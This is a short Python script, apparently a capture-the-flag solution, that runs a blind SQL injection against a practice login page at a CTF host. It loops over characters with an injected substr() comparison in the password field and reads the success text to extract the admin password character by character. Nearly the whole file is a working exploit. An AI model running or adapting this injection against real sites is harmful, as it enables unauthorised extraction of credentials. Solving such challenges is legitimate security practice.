import requests


sql1 = "' OR {0} = length(answer) -- "
url = 'http://ctfq.sweetduet.info:10080/~q6/'
proxies = {'http': 'http://localhost:8888', 'https': 'https://localhost:8888'}


chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
index2 = 1


def search_char(index):
    sql2 = "' OR '{0}' = substr(pass, {1}, 1) -- "
    for c in chars:
        data2 = {
            'id': 'admin',
            'pass': sql2.format(c, index),
        }
        # res2 = requests.post(url=url, data=data2, proxies=proxies)
        res2 = requests.post(url=url, data=data2)
        if 'Congratulations' in res2.text:
            print('[+]hit!! WHERE:{0}, char:{1}'.format(data2['pass'], c))
            return


for i in range(16):
    search_char(i + 1 + 5)
